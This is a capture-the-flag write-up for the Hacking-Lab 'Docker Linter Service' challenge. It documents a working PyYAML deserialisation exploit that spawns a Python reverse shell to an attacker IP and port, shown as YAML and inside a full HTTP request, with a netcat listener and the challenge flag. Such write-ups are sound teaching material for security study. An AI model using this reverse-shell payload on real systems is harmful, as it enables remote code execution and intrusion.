# HV20.19 Docker Linter Service

| <!-- --> | <!-- --> |
| --- | --- |
| **Author**     | The Compiler |
| **Level**      | hard |
| **Categories** | `web security`, `exploitation` |

## Description
Docker Linter is a useful web application ensuring that your Docker-related files follow best practices. Unfortunately, there's a security issue in there...

### Requirements
This challenge requires a reverse shell. You can use the provided Web Shell or the VPN to solve this challenge (see `RESOURCES` on top).

Note: The VPN connection information has been updated.

## Approaches

I tried several potential approaches only one of them allowed me to successfully create a reverse shell.

### Failing: Abuse Content-Disposition header

This approach tried abusing the `filename` property of the `Content-Disposition` header. Web applications sometimes do not validate well filenames and therefore allow to override application files.

The following request generates a 500 error as I added a `filename` statement to the request in a place where no such statement was expected.
```
POST /env HTTP/1.1
Host: 6a282452-49f7-4ef9-9fba-c32ac07baca3.idocker.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------352734889893943994491840542
Content-Length: 710
Origin: https://6a282452-49f7-4ef9-9fba-c32ac07baca3.idocker.vuln.land
Connection: close
Referer: https://6a282452-49f7-4ef9-9fba-c32ac07baca3.idocker.vuln.land/env
Cookie: session=eyJjc3JmX3Rva2VuIjoiNWE4NDc0YjZiMTkxYzBjZGY4NzJjMDVjZWMxZTA0YzJkNDY5MmJhNSJ9.X95Rvw.c66m5LLW6FLAnrX-PBa0movpUrg
Upgrade-Insecure-Requests: 1

-----------------------------352734889893943994491840542
Content-Disposition: form-data; name="csrf_token"

IjVhODQ3NGI2YjE5MWMwY2RmODcyYzA1Y2VjMWUwNGMyZDQ2OTJiYTUi.X95aRg.zhO9krHN6eIQ27aOpTdsgnP8PYk
-----------------------------352734889893943994491840542
Content-Disposition: form-data; name="contents"; filename="/dev/urandom"

nananananananananananana=batman
-----------------------------352734889893943994491840542
Content-Disposition: form-data; name="uploaded"; filename=""
Content-Type: application/octet-stream


-----------------------------352734889893943994491840542
Content-Disposition: form-data; name="submit"

Submit
-----------------------------352734889893943994491840542--
```

As discovered later, this attack was prevented by using `utils.secure_filename(uploaded.filename)` in the app code.


### Failing: Find a RCE vulnerability in one of the dependencies

Next, I searched through the different tools that were invoked by the main app. I hoped for some unfixed RCE vulnerability in one of them. I did not find a vulnerability, though. Dependencies were:
- dockerlint.js: https://github.com/redcoolbeans/dockerlint
- hadolint: https://github.com/hadolint/hadolint
- dockerfile_lint: https://github.com/projectatomic/dockerfile_lint
- yamllint: https://github.com/adrienverge/yamllint
- docker-compose: https://github.com/docker/compose
- dotenv-linter: https://github.com/dotenv-linter/dotenv-linter


### Pyyaml RCE vulnerability

Finally, I got a hint to check for an RCE in pyyaml and indeed there's several exploits listed in the open ticket at https://github.com/yaml/pyyaml/issues/420. 

The issue, as indicated in the discussion was partially fixed, so `!!python/name:xxx` yaml tags are not interpreted any longer. So, I tried to use the object only approach as described at https://github.com/yaml/pyyaml/issues/420#issuecomment-663670547.

Locally, the following payload indeed worked (yay!):
```yaml
!!python/object/new:tuple [!!python/object/new:map [!!python/object/new:type [!!python/object/new:subprocess.Popen {}], [['ls']]]]
```

Once more a nice reverse shell payload was crafted inspired by https://github.com/swisskyrepo/PayloadsAllTheThings/blob/67752de6e9d927c2678b1c64357bc4450ed50ecf/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python.

Experimenting around led me to the conclusion that payloads accessing `/dev/tcp` or `/dev/udp` work in rare cases only, as these devices oftentimes are not available.

After some (long) fiddling and some help by *mcia*, I was able to have the following working payload:
```yaml
!!python/object/new:tuple [!!python/object/new:map [!!python/object/new:type [!!python/object/new:subprocess.Popen {}], [['python3', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.0.6",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")']]]]
```

Embedded into a request, this looks as follows:
```
POST /compose HTTP/1.1
Host: 391e7818-bff7-4975-9ea5-a7d701884dbb.idocker.vuln.land
Connection: close
Content-Length: 924
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://391e7818-bff7-4975-9ea5-a7d701884dbb.idocker.vuln.land
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybAfclg55CgdMZAnH
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://391e7818-bff7-4975-9ea5-a7d701884dbb.idocker.vuln.land/compose
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJjc3JmX3Rva2VuIjoiZmFiYWZiZjQ1Y2IwNjgwYWFkMjFmZGFkYTI3MzFiMzQyZTM2NTFiYiJ9.X98r3Q.8DZeJ-BtyuNTQiJMDAz6oabxZDQ

------WebKitFormBoundarybAfclg55CgdMZAnH
Content-Disposition: form-data; name="csrf_token"

ImZhYmFmYmY0NWNiMDY4MGFhZDIxZmRhZGEyNzMxYjM0MmUzNjUxYmIi.X98r4A.DZtbbXA1aeRf12PC85GECKA5n60
------WebKitFormBoundarybAfclg55CgdMZAnH
Content-Disposition: form-data; name="contents"

!!python/object/new:tuple [!!python/object/new:map [!!python/object/new:type [!!python/object/new:subprocess.Popen {}], [['python3', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.0.6",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")']]]]
------WebKitFormBoundarybAfclg55CgdMZAnH
Content-Disposition: form-data; name="uploaded"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarybAfclg55CgdMZAnH
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundarybAfclg55CgdMZAnH--
```

Again, on the client side, I prepared my netcat to listen on 4242 (`nc -nlvp 4242`) and, once the reverse shell connected, I was able to find the flag in the file `flag.txt`.

BTW, find the server [source code here](./dec19.tar.gz).

## Tools
- python3
- nc
- BurpSuite
- DuckDuck Go
- The Hacking-Lab VPN client, which did not work over my local network for some unknown but time absorbing reason 🙈

## Flag
`HV20{pyy4ml-full-l04d-15-1n53cur3-4nd-b0rk3d}`

